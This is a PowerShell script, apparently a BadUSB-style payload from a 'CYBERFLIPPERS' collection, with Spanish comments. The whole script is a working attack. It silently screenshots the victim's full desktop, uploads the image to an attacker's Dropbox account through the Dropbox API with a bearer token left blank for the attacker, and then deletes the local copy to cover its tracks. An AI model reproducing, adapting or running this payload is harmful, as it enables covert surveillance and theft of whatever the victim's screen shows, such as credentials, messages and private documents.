########################################################################################################################
#    _______     ______  ______ _____  ______ _      _____ _____  _____  ______ _____   _____                           # 
#   / ____\ \   / /  _ \|  ____|  __ \|  ____| |    |_   _|  __ \|  __ \|  ____|  __ \ / ____|                        # 
#  | |     \ \_/ /| |_) | |__  | |__) | |__  | |      | | | |__) | |__) | |__  | |__) | (___                          # 
#  | |      \   / |  _ <|  __| |  _  /|  __| | |      | | |  ___/|  ___/|  __| |  _  / \___ \                         # 
#  | |____   | |  | |_) | |____| | \ \| |    | |____ _| |_| |    | |    | |____| | \ \ ____) |                        # 
#   \_____|  |_|  |____/|______|_|  \_\_|    |______|_____|_|    |_|    |______|_|  \_\_____/                          # 
 #########################################################################################################################           
 $db = "" # Tu token de acceso a Dropbox

# Función para subir un archivo a Dropbox
function DropBox-Upload {
    param (
        [string]$SourceFilePath
    )
    
    if (-not (Test-Path $SourceFilePath)) {
        Write-Host "El archivo $SourceFilePath no existe."
        return
    }

    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"

    $apiArgs = @{
        path = $TargetFilePath
        mode = "add"
        autorename = $true
        mute = $false
    } | ConvertTo-Json -Compress
    
    $headers = @{
        "Authorization" = "Bearer $db"
        "Dropbox-API-Arg" = $apiArgs
        "Content-Type" = "application/octet-stream"
    }
    
    try {
        Write-Host "Subiendo $SourceFilePath a Dropbox..."
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -InFile $SourceFilePath
        Write-Host "Archivo subido correctamente a Dropbox."
    } catch {
        Write-Host "Error al subir el archivo a Dropbox: $_"
    }
}

# Cargar System.Windows.Forms y tomar una captura de pantalla
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

try {
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    
    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
    
    # Guardar la captura de pantalla en un archivo temporal
    $filePath = "$env:TEMP\sc.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    
    # Subir la captura de pantalla a Dropbox
    DropBox-Upload -SourceFilePath $filePath
} catch {
    Write-Host "Error al tomar la captura de pantalla o guardar el archivo: $_"
} finally {
    # Asegurarse de liberar los recursos gráficos y eliminar el archivo temporal
    if ($graphics) { $graphics.Dispose() }
    if ($bitmap) { $bitmap.Dispose() }
    if (Test-Path $filePath) { Remove-Item -Path $filePath -Force }
}
